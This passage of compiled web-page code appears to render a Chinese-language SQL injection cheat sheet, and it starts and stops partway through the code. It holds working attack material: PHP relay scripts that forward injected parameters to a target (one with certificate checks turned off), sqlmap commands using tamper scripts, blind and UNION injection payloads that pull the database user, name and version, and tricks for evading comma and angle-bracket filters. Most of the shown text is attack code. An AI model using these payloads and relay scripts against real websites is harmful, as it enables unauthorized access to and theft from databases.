"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_URL"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"     \n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// 设置header   "),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_HEADER"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"    \n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。   "),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_RETURNTRANSFER"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"    \n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// 运行cURL，请求网页   "),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$data")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_exec"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"   \n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// 关闭URL请求   "),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_close"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"sqlmap不能忽略证书，跑不了https的网站")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(t.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-php"}),Object(t.b)("span",s({parentName:"code"},{className:"token php language-php"}),Object(t.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$url")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"https://x.x.x.x/aaa.php"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$sql")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),"arg",Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$s")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"urlencode"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$sql"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$params")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"email=',Object(t.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$s")),'&password=aa"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"//写出到文件分析."),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$fp"),Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"fopen"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'result.txt'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'a'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"fwrite"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$fp"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'Params:'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$params"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"\\n"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"fclose"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$fp"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_init"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_URL"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$url"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_SSL_VERIFYPEER"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token boolean constant"}),"FALSE"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";")," ",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// https请求 不验证证书和hosts"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_SSL_VERIFYHOST"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token boolean constant"}),"FALSE"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_RETURNTRANSFER"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";")," \n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_HEADER"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_USERAGENT"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_TIMEOUT"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"15"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_POST"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"    ",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// post 提交方式"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token constant"}),"CURLOPT_POSTFIELDS"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),",")," ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$params"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$output")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_exec"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_close"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$ch"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$a")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"strlen"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$output"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(t.b)("span",s({parentName:"span"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$a"),Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=="),Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"2846"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(t.b)("span",s({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"1"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}"),Object(t.b)("span",s({parentName:"span"},{className:"token keyword"}),"else"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(t.b)("span",s({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"2"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}"))))),Object(t.b)("h3",{className:"__internal",id:"base64变形注入"},"Base64变形注入",Object(t.b)("a",s({parentName:"h3"},{href:"#base64%E5%8F%98%E5%BD%A2%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"http://xxx.com/?id=MQ==        只加密参数\nhttp://xxx.com/?aWQ9MQ==    连参数名一起加密了"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"只加密参数，用sqlmap的脚本即可")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(t.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-bash"}),"sqlmap -u http://xxx.com/?id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"MQ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"==")," --tamper base64encode.py --dbs"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"参数名也加密了，用中转注入")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(t.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-php"}),"//trans_sqli.php\n",Object(t.b)("span",s({parentName:"code"},{className:"token php language-php"}),Object(t.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id"),Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"base64_encode"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"id="'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'id'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(t.b)("span",s({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"file_get_contents"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"http://xxx.com/sqli.php?',Object(t.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"{"),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}")),'"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"    ",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"//sqli.php是原网页"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(t.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(t.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-bash"}),"sqlmap-u ",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"http://127.0.0.1/trans_sqli.php?id=12"')," -v3 --dbs"))),Object(t.b)("h3",{className:"__internal",id:"过滤了逗号怎么办-1"},"过滤了逗号怎么办",Object(t.b)("a",s({parentName:"h3"},{href:"#%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%E6%80%8E%E4%B9%88%E5%8A%9E-1","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"盲注的时候")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"LIMIT")," M ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"OFFSET")," N    \n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--这里的 M 是最大回显限度，N是偏移量"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--与limit N,M 有相同效果"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and ascii(substr((select database()),1,1))=xxx#\n--可变为\n'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ascii",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substr",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"for")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"xxx",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"union联合查询注入时")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"b ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"c",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"23"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"b ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," CONCAT_WS",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"CHAR"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"32"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"58"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"32"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"version",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"c",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"23")))),Object(t.b)("h3",{className:"__internal",id:"between-and代替--尖括号"},"Between And代替 “>” 尖括号",Object(t.b)("a",s({parentName:"h3"},{href:"#between-and%E4%BB%A3%E6%9B%BF--%E5%B0%96%E6%8B%AC%E5%8F%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"在",Object(t.b)("inlineCode",{parentName:"p"},"sqlmap"),"中使用between and 代替其它字符加上 ",Object(t.b)("inlineCode",{parentName:"p"},"--tamper=between")," 即可"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"判断条件真假")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"2 > 1   #真\n0 > 1   #假\n#以下用between and 实现判断真假\n2 between 1 and 3   #真\n3 betwwen 1 and 2   #假"))),Object(t.b)("p",null,Object(t.b)("inlineCode",{parentName:"p"},"between and"),"还支持16进制,所以可以用16进制,来绕过单引号的过滤"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," 